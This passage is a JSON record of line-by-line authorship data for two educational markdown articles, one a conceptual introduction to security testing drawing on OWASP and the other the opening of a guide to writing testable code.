        "content": "  head: head.md"
      },
      {
        "lineNumber": 6,
        "author": {
          "gitId": "madanalogy"
        },
        "content": "  siteNav: mainNav.md"
      },
      {
        "lineNumber": 7,
        "author": {
          "gitId": "madanalogy"
        },
        "content": "  pageNav: 3"
      },
      {
        "lineNumber": 8,
        "author": {
          "gitId": "madanalogy"
        },
        "content": "\u003c/frontmatter\u003e"
      },
      {
        "lineNumber": 9,
        "author": {
          "gitId": "madanalogy"
        },
        "content": ""
      },
      {
        "lineNumber": 10,
        "author": {
          "gitId": "madanalogy"
        },
        "content": "\u003cdiv class\u003d\"website-content\"\u003e"
      },
      {
        "lineNumber": 11,
        "author": {
          "gitId": "madanalogy"
        },
        "content": ""
      },
      {
        "lineNumber": 12,
        "author": {
          "gitId": "madanalogy"
        },
        "content": "{{ booktitle | safe }}"
      },
      {
        "lineNumber": 13,
        "author": {
          "gitId": "madanalogy"
        },
        "content": ""
      },
      {
        "lineNumber": 14,
        "author": {
          "gitId": "madanalogy"
        },
        "content": "# Introduction to Security Testing"
      },
      {
        "lineNumber": 15,
        "author": {
          "gitId": "madanalogy"
        },
        "content": ""
      },
      {
        "lineNumber": 16,
        "author": {
          "gitId": "madanalogy"
        },
        "content": "**Author: [Ahmed Bahajjaj](https://github.com/madanalogy)**\u003cbr\u003e"
      },
      {
        "lineNumber": 17,
        "author": {
          "gitId": "madanalogy"
        },
        "content": "Reviewers: [James Pang](https://github.com/jamessspanggg), [Jeffry Lum](https://github.com/j-lum), [Tiu Wee Han](https://github.com/tiuweehan)"
      },
      {
        "lineNumber": 18,
        "author": {
          "gitId": "madanalogy"
        },
        "content": ""
      },
      {
        "lineNumber": 19,
        "author": {
          "gitId": "madanalogy"
        },
        "content": "\u003cbox id\u003d\"article-toc\"\u003e"
      },
      {
        "lineNumber": 20,
        "author": {
          "gitId": "madanalogy"
        },
        "content": ""
      },
      {
        "lineNumber": 21,
        "author": {
          "gitId": "madanalogy"
        },
        "content": "* [Introduction to Security Testing](#introduction-to-security-testing)"
      },
      {
        "lineNumber": 22,
        "author": {
          "gitId": "madanalogy"
        },
        "content": "    * [What Is Security Testing?‎](#what-is-security-testing)"
      },
      {
        "lineNumber": 23,
        "author": {
          "gitId": "madanalogy"
        },
        "content": "    * [Why Have Security Testing?](#why-have-security-testing)"
      },
      {
        "lineNumber": 24,
        "author": {
          "gitId": "madanalogy"
        },
        "content": "    * [Security Testing in Action](#security-testing-in-action)"
      },
      {
        "lineNumber": 25,
        "author": {
          "gitId": "madanalogy"
        },
        "content": "    * [Where to Go From Here?](#where-to-go-from-here)"
      },
      {
        "lineNumber": 26,
        "author": {
          "gitId": "madanalogy"
        },
        "content": "\u003c/box\u003e"
      },
      {
        "lineNumber": 27,
        "author": {
          "gitId": "madanalogy"
        },
        "content": ""
      },
      {
        "lineNumber": 28,
        "author": {
          "gitId": "madanalogy"
        },
        "content": "## What Is Security Testing?"
      },
      {
        "lineNumber": 29,
        "author": {
          "gitId": "madanalogy"
        },
        "content": ""
      },
      {
        "lineNumber": 30,
        "author": {
          "gitId": "madanalogy"
        },
        "content": "Testing is defined by the Open Web Application Security Project (\u003ctooltip content\u003d\"OWASP is a worldwide non-profit organization focused on improving the security of software.\"\u003e__OWASP__\u003c/tooltip\u003e) as a process of comparing the state of a system or application against a set of criteria[^1]. Security testing then is a type of software testing where the criteria to be compared against comprise of security requirements."
      },
      {
        "lineNumber": 31,
        "author": {
          "gitId": "madanalogy"
        },
        "content": ""
      },
      {
        "lineNumber": 32,
        "author": {
          "gitId": "madanalogy"
        },
        "content": "The OWASP Zed-Attack-Proxy (ZAP) Project defines software security testing as the process of assessing and testing a system to discover security risks and \u003ctooltip content\u003d\"A vulnerability is a hole or a weakness in a system that allows an attacker to cause harm to the stakeholders of the system.\"\u003e__vulnerabilities__\u003c/tooltip\u003e of the system and its data[^2]. Assessments are defined as the analysis and discovery of vulnerabilities without attempting to actually exploit those vulnerabilities, and testing as the discovery and attempted exploitation of vulnerabilities."
      },
      {
        "lineNumber": 33,
        "author": {
          "gitId": "madanalogy"
        },
        "content": ""
      },
      {
        "lineNumber": 34,
        "author": {
          "gitId": "madanalogy"
        },
        "content": "### Types of Security Testing"
      },
      {
        "lineNumber": 35,
        "author": {
          "gitId": "madanalogy"
        },
        "content": ""
      },
      {
        "lineNumber": 36,
        "author": {
          "gitId": "madanalogy"
        },
        "content": "Security testing is often categorised, somewhat arbitrarily, according to either the type of vulnerability being tested or the type of testing being done. A common categorisation as defined by OWASP ZAP is as follows[^2]:"
      },
      {
        "lineNumber": 37,
        "author": {
          "gitId": "madanalogy"
        },
        "content": ""
      },
      {
        "lineNumber": 38,
        "author": {
          "gitId": "madanalogy"
        },
        "content": "- __Vulnerability Assessment__: The system is scanned and analyzed for security vulnerabilities."
      },
      {
        "lineNumber": 39,
        "author": {
          "gitId": "madanalogy"
        },
        "content": "- __Penetration Testing__: The system undergoes analysis and attack from simulated malicious attackers."
      },
      {
        "lineNumber": 40,
        "author": {
          "gitId": "madanalogy"
        },
        "content": "- __Runtime Testing__: The system undergoes analysis and security testing from an end-user."
      },
      {
        "lineNumber": 41,
        "author": {
          "gitId": "madanalogy"
        },
        "content": "- __Code Review__: The system code undergoes a detailed review and analysis looking specifically for security vulnerabilities."
      },
      {
        "lineNumber": 42,
        "author": {
          "gitId": "madanalogy"
        },
        "content": ""
      },
      {
        "lineNumber": 43,
        "author": {
          "gitId": "madanalogy"
        },
        "content": "\u003cbox type\u003d\"info\"\u003eNote that risk assessment, which is commonly listed as part of security testing, is not included in this list. That is because a risk assessment is not actually a test but rather the analysis of the perceived severity of different risks (software security, personnel security, hardware security, etc.) and any mitigation steps for those risks.\u003c/box\u003e"
      },
      {
        "lineNumber": 44,
        "author": {
          "gitId": "madanalogy"
        },
        "content": ""
      },
      {
        "lineNumber": 45,
        "author": {
          "gitId": "madanalogy"
        },
        "content": "## Why Have Security Testing?"
      },
      {
        "lineNumber": 46,
        "author": {
          "gitId": "madanalogy"
        },
        "content": ""
      },
      {
        "lineNumber": 47,
        "author": {
          "gitId": "madanalogy"
        },
        "content": "Security testing ensures that a system is secure. Since security requirements differ depending on the goals of the project, it is often hard to define the concept of what it means to be secure. One definition is as follows[^3]: "
      },
      {
        "lineNumber": 48,
        "author": {
          "gitId": "madanalogy"
        },
        "content": ""
      },
      {
        "lineNumber": 49,
        "author": {
          "gitId": "madanalogy"
        },
        "content": "\u003cbox type\u003d\"definition\"\u003eSecurity means that authorized access is granted to protected data and unauthorized access is restricted.\u003c/box\u003e "
      },
      {
        "lineNumber": 50,
        "author": {
          "gitId": "madanalogy"
        },
        "content": ""
      },
      {
        "lineNumber": 51,
        "author": {
          "gitId": "madanalogy"
        },
        "content": "This definition encompasses two major aspects; first is the protection of data and the second is access to that data. Whether the system is desktop or web-based, we will loosely define security as revolving around the two aforementioned aspects."
      },
      {
        "lineNumber": 52,
        "author": {
          "gitId": "madanalogy"
        },
        "content": ""
      },
      {
        "lineNumber": 53,
        "author": {
          "gitId": "madanalogy"
        },
        "content": "Due to the logical limitations of security testing however, passing security testing is not an indication that no flaws exist or that the system adequately satisfies the security requirements[^4]. Why have security testing then? In brief, unauthorised access to data is a very expensive problem[^5] and since a system would be more secure with security testing than without[^6], an effort should be made to have security testing."
      },
      {
        "lineNumber": 54,
        "author": {
          "gitId": "madanalogy"
        },
        "content": ""
      },
      {
        "lineNumber": 55,
        "author": {
          "gitId": "madanalogy"
        },
        "content": "\u003cbox type\u003d\"warning\"\u003eThere is more to the concept of security than the working definition used here.\u003c/box\u003e"
      },
      {
        "lineNumber": 56,
        "author": {
          "gitId": "madanalogy"
        },
        "content": ""
      },
      {
        "lineNumber": 57,
        "author": {
          "gitId": "madanalogy"
        },
        "content": "## Security Testing in Action"
      },
      {
        "lineNumber": 58,
        "author": {
          "gitId": "madanalogy"
        },
        "content": ""
      },
      {
        "lineNumber": 59,
        "author": {
          "gitId": "madanalogy"
        },
        "content": "Security testing can be integrated into every stage of the Software Development Life Cycle [(SDLC)](https://se-education.org/se-book/processModels/). A conceptual example of such an integration is as follows[^7]:"
      },
      {
        "lineNumber": 60,
        "author": {
          "gitId": "madanalogy"
        },
        "content": ""
      },
      {
        "lineNumber": 61,
        "author": {
          "gitId": "madanalogy"
        },
        "content": "\u003ccenter\u003e"
      },
      {
        "lineNumber": 62,
        "author": {
          "gitId": "madanalogy"
        },
        "content": "\u003cpic src\u003d\"security-testing/Sec-Test-Fig-1.png\" width\u003d\"800\" alt\u003d\"Example\"\u003e"
      },
      {
        "lineNumber": 63,
        "author": {
          "gitId": "madanalogy"
        },
        "content": "Figure 1 - Example of Security Testing during a SDLC."
      },
      {
        "lineNumber": 64,
        "author": {
          "gitId": "madanalogy"
        },
        "content": "\u003c/pic\u003e"
      },
      {
        "lineNumber": 65,
        "author": {
          "gitId": "madanalogy"
        },
        "content": "\u003c/center\u003e"
      },
      {
        "lineNumber": 66,
        "author": {
          "gitId": "madanalogy"
        },
        "content": ""
      },
      {
        "lineNumber": 67,
        "author": {
          "gitId": "madanalogy"
        },
        "content": "\u003cbr\u003e"
      },
      {
        "lineNumber": 68,
        "author": {
          "gitId": "madanalogy"
        },
        "content": ""
      },
      {
        "lineNumber": 69,
        "author": {
          "gitId": "madanalogy"
        },
        "content": "To understand this in more detail, we can deconstruct the application of security testing into its manifestation in different stages of software development."
      },
      {
        "lineNumber": 70,
        "author": {
          "gitId": "madanalogy"
        },
        "content": ""
      },
      {
        "lineNumber": 71,
        "author": {
          "gitId": "madanalogy"
        },
        "content": "### At a Glance"
      },
      {
        "lineNumber": 72,
        "author": {
          "gitId": "madanalogy"
        },
        "content": ""
      },
      {
        "lineNumber": 73,
        "author": {
          "gitId": "madanalogy"
        },
        "content": "The following series of steps adapted from the OWASP Testing Guide[^1] provide general applications of security testing in a generic SDLC process."
      },
      {
        "lineNumber": 74,
        "author": {
          "gitId": "madanalogy"
        },
        "content": ""
      },
      {
        "lineNumber": 75,
        "author": {
          "gitId": "madanalogy"
        },
        "content": "\u003ccenter\u003e"
      },
      {
        "lineNumber": 76,
        "author": {
          "gitId": "madanalogy"
        },
        "content": "\u003cpic src\u003d\"security-testing/Sec-Test-Fig-2.png\" width\u003d\"650\" alt\u003d\"Workflow\"\u003e"
      },
      {
        "lineNumber": 77,
        "author": {
          "gitId": "madanalogy"
        },
        "content": "Figure 2 - Testing Framework Workflow from the OWASP Testing Guide."
      },
      {
        "lineNumber": 78,
        "author": {
          "gitId": "madanalogy"
        },
        "content": "\u003c/pic\u003e"
      },
      {
        "lineNumber": 79,
        "author": {
          "gitId": "madanalogy"
        },
        "content": "\u003c/center\u003e"
      },
      {
        "lineNumber": 80,
        "author": {
          "gitId": "madanalogy"
        },
        "content": ""
      },
      {
        "lineNumber": 81,
        "author": {
          "gitId": "madanalogy"
        },
        "content": "\u003cbr\u003e"
      },
      {
        "lineNumber": 82,
        "author": {
          "gitId": "madanalogy"
        },
        "content": ""
      },
      {
        "lineNumber": 83,
        "author": {
          "gitId": "madanalogy"
        },
        "content": "### Step 1: Before Development"
      },
      {
        "lineNumber": 84,
        "author": {
          "gitId": "madanalogy"
        },
        "content": ""
      },
      {
        "lineNumber": 85,
        "author": {
          "gitId": "madanalogy"
        },
        "content": "#### 1.1 Define an SDLC"
      },
      {
        "lineNumber": 86,
        "author": {
          "gitId": "madanalogy"
        },
        "content": ""
      },
      {
        "lineNumber": 87,
        "author": {
          "gitId": "madanalogy"
        },
        "content": "Before application development starts, an adequate SDLC must be defined where security is inherent at each stage. "
      },
      {
        "lineNumber": 88,
        "author": {
          "gitId": "madanalogy"
        },
        "content": ""
      },
      {
        "lineNumber": 89,
        "author": {
          "gitId": "madanalogy"
        },
        "content": "#### 1.2 Review Policies and Standards"
      },
      {
        "lineNumber": 90,
        "author": {
          "gitId": "madanalogy"
        },
        "content": ""
      },
      {
        "lineNumber": 91,
        "author": {
          "gitId": "madanalogy"
        },
        "content": "Ensure that there are appropriate policies, standards, and documentation in place. Documentation is extremely important as it gives development teams guidelines and policies that they can follow. An example of one such documentation is the OWASP Secure Coding Practices Quick Reference Guide[^8]."
      },
      {
        "lineNumber": 92,
        "author": {
          "gitId": "madanalogy"
        },
        "content": ""
      },
      {
        "lineNumber": 93,
        "author": {
          "gitId": "madanalogy"
        },
        "content": "\u003cbox type\u003d\"important\"\u003ePeople can only do the right thing if they know what the right thing is.\u003c/box\u003e"
      },
      {
        "lineNumber": 94,
        "author": {
          "gitId": "madanalogy"
        },
        "content": ""
      },
      {
        "lineNumber": 95,
        "author": {
          "gitId": "madanalogy"
        },
        "content": "If the application is to be developed in Java, it is essential that there is a Java secure coding standard. If the application is to use cryptography, it is essential that there is a cryptography standard. No policies or standards can cover every situation that the development team will face. By documenting common and predictable issues, there will be fewer decisions that need to be made during the development process."
      },
      {
        "lineNumber": 96,
        "author": {
          "gitId": "madanalogy"
        },
        "content": ""
      },
      {
        "lineNumber": 97,
        "author": {
          "gitId": "madanalogy"
        },
        "content": "### Step 2: During Definition and Design"
      },
      {
        "lineNumber": 98,
        "author": {
          "gitId": "madanalogy"
        },
        "content": ""
      },
      {
        "lineNumber": 99,
        "author": {
          "gitId": "madanalogy"
        },
        "content": "#### 2.1 Review Security Requirements"
      },
      {
        "lineNumber": 100,
        "author": {
          "gitId": "madanalogy"
        },
        "content": ""
      },
      {
        "lineNumber": 101,
        "author": {
          "gitId": "madanalogy"
        },
        "content": "Security requirements define how an application works from a security perspective. It is essential that the security requirements are tested. In particular, assumptions that are made in the requirements are tested while checking if there are any gaps in the requirement definitions."
      },
      {
        "lineNumber": 102,
        "author": {
          "gitId": "madanalogy"
        },
        "content": ""
      },
      {
        "lineNumber": 103,
        "author": {
          "gitId": "madanalogy"
        },
        "content": "For example, if there is a security requirement that states that users must be registered before they can get access to a particular section of a website, does this mean that the user must be registered with the system or should the user be authenticated? Ensure that requirements are as unambiguous as possible."
      },
      {
        "lineNumber": 104,
        "author": {
          "gitId": "madanalogy"
        },
        "content": ""
      },
      {
        "lineNumber": 105,
        "author": {
          "gitId": "madanalogy"
        },
        "content": "#### 2.2 Review Design \u0026 Architecture"
      },
      {
        "lineNumber": 106,
        "author": {
          "gitId": "madanalogy"
        },
        "content": ""
      },
      {
        "lineNumber": 107,
        "author": {
          "gitId": "madanalogy"
        },
        "content": "Applications should have a documented design and architecture. This documentation can include models, textual documents, and other similar artifacts. It is essential to test these artifacts to ensure that the design and architecture enforce the appropriate level of security as defined in the requirements."
      },
      {
        "lineNumber": 108,
        "author": {
          "gitId": "madanalogy"
        },
        "content": ""
      },
      {
        "lineNumber": 109,
        "author": {
          "gitId": "madanalogy"
        },
        "content": "Identifying security flaws in the design phase is not only one of the most cost-efficient places to identify flaws, but can be one of the most effective places to make changes. For example, if it is identified that the design calls for authorization decisions to be made in multiple places, it may be appropriate to consider having a central component responsible for authorization. If the application is performing data validation at multiple places, it may be appropriate to develop a central validation framework (i.e. fixing input validation in one place, rather than in hundreds of places)."
      },
      {
        "lineNumber": 110,
        "author": {
          "gitId": "madanalogy"
        },
        "content": ""
      },
      {
        "lineNumber": 111,
        "author": {
          "gitId": "madanalogy"
        },
        "content": "### Step 3: During Development"
      },
      {
        "lineNumber": 112,
        "author": {
          "gitId": "madanalogy"
        },
        "content": ""
      },
      {
        "lineNumber": 113,
        "author": {
          "gitId": "madanalogy"
        },
        "content": "#### 3.1 Unit \u0026 System Tests"
      },
      {
        "lineNumber": 114,
        "author": {
          "gitId": "madanalogy"
        },
        "content": ""
      },
      {
        "lineNumber": 115,
        "author": {
          "gitId": "madanalogy"
        },
        "content": "[Unit tests](https://se-education.org/se-book/testing/#unit-testing) and [system tests](https://se-education.org/se-book/testing/#system-testing) should be written to explicitly ensure adherence to functional security requirements. For example, an application with an access control feature should include unit tests to ensure that unauthorised access credentials are not accepted."
      },
      {
        "lineNumber": 116,
        "author": {
          "gitId": "madanalogy"
        },
        "content": ""
      },
      {
        "lineNumber": 117,
        "author": {
          "gitId": "madanalogy"
        },
        "content": "#### 3.2 Code Walk Through"
      },
      {
        "lineNumber": 118,
        "author": {
          "gitId": "madanalogy"
        },
        "content": ""
      },
      {
        "lineNumber": 119,
        "author": {
          "gitId": "madanalogy"
        },
        "content": "The security team should perform a code walk through with the developers, and in some cases, the system architects. A code walk through is a high-level walk through of the code where the developers can explain the logic and flow of the implemented code. It allows the code review team to obtain a general understanding of the code, and allows the developers to explain why certain things were developed the way they were."
      },
      {
        "lineNumber": 120,
        "author": {
          "gitId": "madanalogy"
        },
        "content": ""
      },
      {
        "lineNumber": 121,
        "author": {
          "gitId": "madanalogy"
        },
        "content": "\u003cbox type\u003d\"tip\"\u003eThe purpose is not to perform a code review, but to understand at a high level: the flow, the layout, and the structure of the code that makes up the application.\u003c/box\u003e"
      },
      {
        "lineNumber": 122,
        "author": {
          "gitId": "madanalogy"
        },
        "content": ""
      },
      {
        "lineNumber": 123,
        "author": {
          "gitId": "madanalogy"
        },
        "content": "#### 3.3 Code Reviews"
      },
      {
        "lineNumber": 124,
        "author": {
          "gitId": "madanalogy"
        },
        "content": ""
      },
      {
        "lineNumber": 125,
        "author": {
          "gitId": "madanalogy"
        },
        "content": "Armed with a good understanding of how the code is structured and why certain things were coded the way they were, the tester can now examine the actual code for security defects."
      },
      {
        "lineNumber": 126,
        "author": {
          "gitId": "madanalogy"
        },
        "content": ""
      },
      {
        "lineNumber": 127,
        "author": {
          "gitId": "madanalogy"
        },
        "content": "### Step 4: During Deployment‎"
      },
      {
        "lineNumber": 128,
        "author": {
          "gitId": "madanalogy"
        },
        "content": ""
      },
      {
        "lineNumber": 129,
        "author": {
          "gitId": "madanalogy"
        },
        "content": "#### 4.1 Penetration Testing"
      },
      {
        "lineNumber": 130,
        "author": {
          "gitId": "madanalogy"
        },
        "content": ""
      },
      {
        "lineNumber": 131,
        "author": {
          "gitId": "madanalogy"
        },
        "content": "Having tested the requirements, analyzed the design, and performed code review, it might be assumed that all issues have been caught. Hopefully this is the case, but penetration testing (a.k.a. pentesting) the application after it has been deployed provides a last check to ensure that nothing has been missed."
      },
      {
        "lineNumber": 132,
        "author": {
          "gitId": "madanalogy"
        },
        "content": ""
      },
      {
        "lineNumber": 133,
        "author": {
          "gitId": "madanalogy"
        },
        "content": "\u003cbox type\u003d\"info\"\u003ePenetration testing is carried out as if the tester was a malicious external attacker.\u003c/box\u003e"
      },
      {
        "lineNumber": 134,
        "author": {
          "gitId": "madanalogy"
        },
        "content": ""
      },
      {
        "lineNumber": 135,
        "author": {
          "gitId": "madanalogy"
        },
        "content": "The ultimate goal of pentesting is to search for vulnerabilities so that these vulnerabilities can be addressed. It can also verify that a system is not vulnerable to a known class or specific defect; or, in the case of vulnerabilities that have been reported as fixed, verify that the system is no longer vulnerable to that defect.[^2]"
      },
      {
        "lineNumber": 136,
        "author": {
          "gitId": "madanalogy"
        },
        "content": ""
      },
      {
        "lineNumber": 137,
        "author": {
          "gitId": "madanalogy"
        },
        "content": "## Where to Go From Here?"
      },
      {
        "lineNumber": 138,
        "author": {
          "gitId": "madanalogy"
        },
        "content": ""
      },
      {
        "lineNumber": 139,
        "author": {
          "gitId": "madanalogy"
        },
        "content": "Now that you know conceptually what security testing is about and how it\u0027s generally applied, you can afford to focus on topics depending on your role and interests:"
      },
      {
        "lineNumber": 140,
        "author": {
          "gitId": "madanalogy"
        },
        "content": ""
      },
      {
        "lineNumber": 141,
        "author": {
          "gitId": "madanalogy"
        },
        "content": "- __Developer__: Focus on how you can translate security requirements into actual code. Additionally, it would be worth your while as well to go through the OWASP Secure Coding Practices Quick Reference Guide[^8]."
      },
      {
        "lineNumber": 142,
        "author": {
          "gitId": "madanalogy"
        },
        "content": "- __Project Manager__: Your role is crucial before deployment (in selecting an SDLC and setting out project policies) as well as during requirements definition. It is recommended to read entirely the OWASP Testing Guide[^1] to have a complete understanding of what is required."
      },
      {
        "lineNumber": 143,
        "author": {
          "gitId": "madanalogy"
        },
        "content": "- __Security Specialist__: Your duties often come in the requirements definition stage and system deployment stage, maybe during code walk through as well depending on organisational decisions. Start with the Wikipedia Article on Security Testing[^4] to learn more about security concepts and OWASP ZAP[^2] to learn basic penetration testing."
      },
      {
        "lineNumber": 144,
        "author": {
          "gitId": "madanalogy"
        },
        "content": ""
      },
      {
        "lineNumber": 145,
        "author": {
          "gitId": "madanalogy"
        },
        "content": "[^1]: [OWASP Testing Guide](https://www.owasp.org/images/1/19/OTGv4.pdf): An extremely comprehensive guide on security testing with in-depth coverage of web-application security testing."
      },
      {
        "lineNumber": 146,
        "author": {
          "gitId": "madanalogy"
        },
        "content": "[^2]: [OWASP Zed-Attack-Proxy](https://www.zaproxy.org/getting-started/): A tool for conducting vulnerability assessments and penetration testing."
      },
      {
        "lineNumber": 147,
        "author": {
          "gitId": "madanalogy"
        },
        "content": "[^3]: [Breakdown by SoftwareTestingHelp.com](https://www.softwaretestinghelp.com/how-to-test-application-security-web-and-desktop-application-security-testing-techniques/): A breakdown of security testing into common attack vectors and recommended tools."
      },
      {
        "lineNumber": 148,
        "author": {
          "gitId": "madanalogy"
        },
        "content": "[^4]: [Wikipedia Article on Security Testing](https://en.wikipedia.org/wiki/Security_testing): Coverage on the abstract concepts of security testing and the taxonomy involved."
      },
      {
        "lineNumber": 149,
        "author": {
          "gitId": "madanalogy"
        },
        "content": "[^5]: [2017 Cost of Data Breach Study](https://www.ibm.com/downloads/cas/ZYKLN2E3): IBM sponsored report for a study on the cost of data breaches in 2017."
      },
      {
        "lineNumber": 150,
        "author": {
          "gitId": "madanalogy"
        },
        "content": "[^6]: [OWASP Top 10 Examples](https://medium.com/@cxosmo/owasp-top-10-real-world-examples-part-1-a540c4ea2df5): Real examples of what might happen if Security Testing is overlooked."
      },
      {
        "lineNumber": 151,
        "author": {
          "gitId": "madanalogy"
        },
        "content": "[^7]: [Overview by Guru99.com](https://www.guru99.com/what-is-security-testing.html): A brief summary of Security Testing and it\u0027s role in Software Testing."
      },
      {
        "lineNumber": 152,
        "author": {
          "gitId": "madanalogy"
        },
        "content": "[^8]: [OWASP Secure Coding Practices](https://www.owasp.org/images/0/08/OWASP_SCP_Quick_Reference_Guide_v2.pdf): A quick reference guide for secure coding practices."
      },
      {
        "lineNumber": 153,
        "author": {
          "gitId": "madanalogy"
        },
        "content": ""
      },
      {
        "lineNumber": 154,
        "author": {
          "gitId": "madanalogy"
        },
        "content": "\u003c/div\u003e"
      }
    ],
    "authorContributionMap": {
      "madanalogy": 154
    }
  },
  {
    "path": "contents/testing/writing-testable-code.md",
    "fileType": "md",
    "lines": [
      {
        "lineNumber": 1,
        "author": {
          "gitId": "-"
        },
        "content": "\u003cfrontmatter\u003e"
      },
      {
        "lineNumber": 2,
        "author": {
          "gitId": "-"
        },
        "content": "  title: Writing Testable Code"
      },
      {
        "lineNumber": 3,
        "author": {
          "gitId": "-"
        },
        "content": "  header: pagetop.md"
      },
      {
        "lineNumber": 4,
        "author": {
          "gitId": "-"
        },
        "content": "  footer: footer.md"
      },
      {
        "lineNumber": 5,
        "author": {
          "gitId": "-"
        },
        "content": "  head: head.md"
      },
      {
        "lineNumber": 6,
        "author": {
          "gitId": "-"
        },
        "content": "  siteNav: mainNav.md"
      },
      {
        "lineNumber": 7,
        "author": {
          "gitId": "-"
        },
        "content": "  pageNav: 3"
      },
      {
        "lineNumber": 8,
        "author": {
          "gitId": "-"
        },
        "content": "\u003c/frontmatter\u003e"
      },
      {
        "lineNumber": 9,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 10,
        "author": {
          "gitId": "-"
        },
        "content": "\u003cdiv class\u003d\"website-content\"\u003e"
      },
      {
        "lineNumber": 11,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 12,
        "author": {
          "gitId": "-"
        },
        "content": "{{ booktitle | safe }}"
      },
      {
        "lineNumber": 13,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 14,
        "author": {
          "gitId": "-"
        },
        "content": "# Writing Testable Code"
      },
      {
        "lineNumber": 15,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 16,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "\u003cbox id\u003d\"article-toc\"\u003e"
      },
      {
        "lineNumber": 17,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": ""
      },
      {
        "lineNumber": 18,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "* [Flaw #1: No seams for isolating the class under test](#flaw-1-no-seams-for-isolating-the-class-under-test)"
      },
      {
        "lineNumber": 19,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "  * [Rule #1: Don\u0027t do actual work in constructors](#rule-1-don-t-do-actual-work-in-constructors)"
      },
      {
        "lineNumber": 20,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "  * [Rule #2: Don\u0027t mix object construction with application logic](#rule-2-don-t-mix-object-construction-with-application-logic)"
      },
      {
        "lineNumber": 21,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "  * [Rule #3: Don\u0027t mix Service Objects with Value Objects](#rule-3-don-t-mix-service-objects-with-value-objects)"
      },
      {
        "lineNumber": 22,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "  * [Rule #4: Avoid Static Methods](#rule-4-avoid-static-methods)"
      },
      {
        "lineNumber": 23,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "  * [Rule #5: Favor composition over inheritance](#rule-5-favor-composition-over-inheritance)"
      },
      {
        "lineNumber": 24,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "* [Flaw #2: Brittle Global State \u0026 Singleton](#flaw-2-brittle-global-state-and-amp-singleton)"
      },
      {
        "lineNumber": 25,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "  * [Rule #1: Avoid Global States](#rule-1-avoid-global-states)"
      },
      {
        "lineNumber": 26,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "  * [Rule #2: Avoid Singleton Pattern](#rule-2-avoid-singleton-pattern)"
      },
      {
        "lineNumber": 27,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "* [Flaw #3: Dig Into Collaborators](#flaw-3-dig-into-collaborators)"
      },
      {
        "lineNumber": 28,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "  * [Rule #1: Don\u0027t look for things. Ask for things.](#rule-1-don-t-look-for-things-ask-for-things)"
      },
      {
        "lineNumber": 29,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "* [Flaw #4: Class does too much](#flaw-4-class-does-too-much)"
      },
      {
        "lineNumber": 30,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "  * [Rule #1: Avoid mixing of concerns](#rule-1-avoid-mixing-of-concerns)"
      },
      {
        "lineNumber": 31,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "  * [Rule #2: Favor polymorphism over conditionals](#rule-2-favor-polymorphism-over-conditionals)"
      },
      {
        "lineNumber": 32,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "* [Concluding Notes](#concluding-notes)"
      },
      {
        "lineNumber": 33,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "\u003c/box\u003e"
      },
      {
        "lineNumber": 34,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": ""
      },
      {
        "lineNumber": 35,
        "author": {
          "gitId": "-"
        },
        "content": "When the project is big enough and needs to be maintainable in the long run, it has to rely on automated tests to keep up its quality. Compared to system testing where you test the program as a whole, unit testing has its benefit for being fast (because it only instantiates a small piece of the program) and stable (because it usually mocks out the unstable dependency, e.g. network connection, database connection). Because of this, having automated unit tests becomes extremely important for Object-Oriented programs."
      },
      {
        "lineNumber": 36,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 37,
        "author": {
          "gitId": "-"
        },
        "content": "This article compiles multiple posts from [Google Testing Blog](https://testing.googleblog.com) on how to write more unit-testable code. It explains [four common flaws](https://testing.googleblog.com/2008/11/guide-to-writing-testable-code.html) in untestable code, and rules to follow for each of the flaws. At the end of each rule, you will see link(s) to the original Google Testing Blog posts."
      },
      {
        "lineNumber": 38,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 39,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "## Flaw #1: No Seams for Isolating the Class Under Test"
      },
      {
        "lineNumber": 40,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 41,
        "author": {
          "gitId": "-"
        },
        "content": "Seams is where we prevent the execution of normal code path and is how we achieve isolation of the class under test."
      },
      {
        "lineNumber": 42,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 43,
        "author": {
          "gitId": "-"
        },
        "content": "To create seams in your code, you need to acquire your dependency via [dependency injection](https://en.wikipedia.org/wiki/Dependency_injection). You inject real object for production and [test doubles](https://www.martinfowler.com/bliki/TestDouble.html) for testing. For example, if a class depends on some database connection to retrieve some user data, you can inject a fake database connection to always return prepared data immediately without really performing any database operation."
      },
      {
        "lineNumber": 44,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 45,
        "author": {
          "gitId": "-"
        },
        "content": "That is the basic idea for how seams can help in unit testing. Below are five rules you can follow to create seams in your code."
      },
      {
        "lineNumber": 46,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 47,
        "author": {
          "gitId": "-"
        },
